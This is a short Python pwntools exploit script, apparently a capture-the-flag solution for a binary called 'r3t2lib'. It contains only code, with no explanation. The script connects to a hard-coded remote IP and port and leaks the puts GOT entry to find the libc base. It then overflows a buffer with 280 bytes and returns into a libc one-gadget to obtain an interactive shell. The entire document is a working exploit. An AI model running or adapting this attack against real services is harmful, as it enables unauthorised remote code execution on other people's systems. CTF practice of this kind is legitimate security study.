from pwn import *

context.arch = "amd64"

ip = "140.110.112.77"
port = 2123

r = remote(ip, port)
# r = process("./r3t2lib")

main = 0x4006f6
puts_got = 0x601018
libc_start_got = 0x601030
puts_off = 0x06f690

r.sendlineafter(':', hex(puts_got))
r.recvuntil(':')
libc = int(r.recvline().strip(), 16) - puts_off
log.info(hex(libc))

'''
r.sendlineafter(':', 'a' * 280 + p64(main))
r.sendlineafter(':', hex(libc_start_got))
'''

win = libc + 0x45216
r.sendlineafter(':', b'a' * 280 + p64(win))

r.interactive()
